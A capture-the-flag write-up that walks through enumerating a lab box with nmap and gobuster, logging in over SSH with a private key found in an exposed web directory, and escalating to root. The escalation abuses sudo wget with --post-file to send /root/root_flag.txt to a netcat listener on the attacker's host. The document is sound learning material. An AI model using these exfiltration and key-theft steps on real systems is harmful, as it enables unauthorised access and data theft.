**Tristan Gomez**

To begin the challenge, I ran a classic nmap scan, just passing the `-sV` flag to get the software versions of any services that I find.
```
─$ sudo nmap -sV 10.10.210.190                                                                                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 11:57 PDT
Nmap scan report for 10.10.210.190
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds

```

Looks like we have a website running on port 80 and ssh on port 22. I can't seem to connect to the site from my browser but a `wget http://10.10.216.29` works. Looking at the index.html file, I found `<!-- Jessie don't forget to udate the webiste -->` hidden as a comment. So, we have a potential ssh user now. Let's try to enumerate web pages using gobuster.
```
└─$ gobuster dir -w common.txt -x php,html,txt,js -u 10.10.216.29
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.29
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt,js
[+] Timeout:                 10s
===============================================================
2021/12/12 12:26:09 Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.js              (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 11374]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 277]  
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.216.29/sitemap

```
Hmm, so almost all found pages return 403 forbidden responses, but we do get a 301 redirect on /sitemap which appears to also be a directory. I will enumerate pages in that directory using gobuster again.


```
└─$ gobuster dir -w common.txt -x php,html,txt,js -u 10.10.216.29/sitemap
===============================================================                                                                                                        
Gobuster v3.1.0                                                                                                                                                        
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                          
===============================================================
[+] Url:                     http://10.10.216.29/sitemap
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,php,html,txt
[+] Timeout:                 10s
===============================================================
2021/12/12 12:33:04 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta.js              (Status: 403) [Size: 277]
/.htpasswd.js         (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.js         (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.216.29/sitemap/.ssh/]
/about.html           (Status: 200) [Size: 12232]   
/blog.html
/contact.html
/css
/fonts
/images
/index.html
/js
/shop.html
/services.html
/work.html
```

Oooooh! In the /.ssh directory, I found a private `id_rsa` key. I copied it onto my machine. We have the name `jessie` so lets try to ssh in using the key we just found. Woo! it works without a passphrase!

```
jessie@CorpOne:~$ 
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```
Now that we have the user flag, we need to privesc to get the root flag. Let's check the permissions for this user. 

```
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
    
jessie@CorpOne:~/Documents$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

```


So we can run `wget` as the root user without a password. That's highly suspicious. Let's check gtfobins to see if we can abuse this binary. Looks like we can by running the command below. Since I can run wget as root, I can use this to exfiltrate privileged files. I opened up a nc listener first to catch the root.txt file.
```
sudo wget --post-file=/root/root_flag.txt http://10.8.248.108:1111
--2021-12-12 22:49:22--  http://10.8.248.108:1111/
Connecting to 10.8.248.108:1111... connected.
HTTP request sent, awaiting response... No data received.
Retrying.

```


On the listening end of the connection...
```
└─$ sudo nc -nvlp 1111
[sudo] password for gomez22: 
listening on [any] 1111 ...
connect to [10.8.248.108] from (UNKNOWN) [10.10.216.29] 46280
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.8.248.108:1111
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d

```
Woo! root flag. Another challenge done.